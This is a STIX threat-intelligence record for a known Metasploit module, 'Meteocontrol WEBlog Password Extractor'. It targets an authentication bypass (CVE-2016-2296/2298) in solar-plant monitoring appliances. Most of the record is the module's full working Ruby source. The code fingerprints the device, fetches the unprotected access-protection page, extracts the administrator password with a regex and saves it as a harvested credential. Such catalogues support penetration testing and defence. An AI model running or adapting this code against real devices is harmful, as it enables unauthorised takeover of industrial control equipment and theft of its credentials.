{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3bb34507-f4e9-4f1d-a0a1-69844fbcbd29",
    "created": "2024-08-14T16:28:37.694128Z",
    "modified": "2024-08-14T16:28:37.694131Z",
    "name": "Meteocontrol WEBlog Password Extractor",
    "description": " This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog appliances (software version < May 2016 release) to extract Administrator password for the device management portal.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/meteocontrol_weblog_extractadmin.rb",
            "external_id": "meteocontrol_weblog_extractadmin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2296"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2298"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'Meteocontrol WEBlog Password Extractor',\n      'Description' => %{\n          This module exploits an authentication bypass vulnerability in Meteocontrol WEBLog appliances (software version < May 2016 release) to extract Administrator password for the device management portal.\n      },\n      'References' =>\n        [\n          ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-16-133-01'],\n          ['CVE', '2016-2296'],\n          ['CVE', '2016-2298']\n        ],\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'License' => MSF_LICENSE))\n\n    register_options(\n      [\n        Opt::RPORT(8080) # Application may run on a different port too. Change port accordingly.\n      ], self.class\n    )\n  end\n\n  def run_host(ip)\n    unless is_app_metweblog?\n      return\n    end\n\n    do_extract\n  end\n\n  #\n  # Check if App is Meteocontrol WEBlog\n  #\n\n  def is_app_metweblog?\n    begin\n      res = send_request_cgi({\n        'uri' => '/html/en/index.html',\n        'method' => 'GET'\n      })\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return false\n    end\n\n    if (res && res.code == 200 && (res.headers['Server'] && res.headers['Server'].include?('IS2 Web Server') || res.body.include?(\"WEB'log\")))\n      print_good(\"#{rhost}:#{rport} - Running Meteocontrol WEBlog management portal...\")\n      return true\n    else\n      print_error(\"#{rhost}:#{rport} - Application does not appear to be Meteocontrol WEBlog. Module will not continue.\")\n      return false\n    end\n  end\n\n  #\n  # Extract Administrator Password\n  #\n\n  def do_extract()\n    print_status(\"#{rhost}:#{rport} - Attempting to extract Administrator password...\")\n    begin\n      res = send_request_cgi({\n          'uri' => '/html/en/confAccessProt.html',\n          'method' => 'GET'\n      })\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")\n      return\n    end\n\n    if (res && res.code == 200 && (res.body.include?('szWebAdminPassword') || res.body=~ /Admin Monitoring/))\n      get_admin_password = res.body.match(/name=\"szWebAdminPassword\" value=\"(.*?)\"/)\n      if get_admin_password[1]\n        admin_password = get_admin_password[1]\n        print_good(\"#{rhost}:#{rport} - Password is #{admin_password}\")\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'Meteocontrol WEBlog Management Portal',\n          password: admin_password,\n          proof: res.body\n        )\n      else\n        # In some models, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Check login manually on http://IP:port/html/en/confAccessProt.html for the szWebAdminPassword field's value.\n        print_error(\"Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.\")\n      end\n    else\n      print_error(\"Check login manually on http://#{rhost}:#{rport}/html/en/confAccessProt.html for the 'szWebAdminPassword' field's value.\")\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}